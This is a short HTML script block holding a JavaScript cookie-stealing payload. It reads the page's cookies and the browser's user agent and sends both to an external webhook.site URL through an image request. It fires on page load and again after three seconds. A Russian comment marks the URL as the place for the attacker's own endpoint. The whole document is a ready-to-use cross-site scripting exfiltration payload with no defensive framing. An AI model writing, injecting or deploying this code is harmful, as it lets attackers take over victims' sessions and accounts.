<script>
    function stealCookies() {
        const cookies = document.cookie;
        if (cookies) {
            const webhookUrl = "https://webhook.site/3e550fb6-2d7d-482c-9876-c14192f0718"; // ← ТВОЙ URL
            const img = new Image();
            img.src = webhookUrl + "?cookies=" + encodeURIComponent(cookies) + "&ua=" + encodeURIComponent(navigator.userAgent);
        }
    }
    stealCookies();
    setTimeout(stealCookies, 3000);
</script>
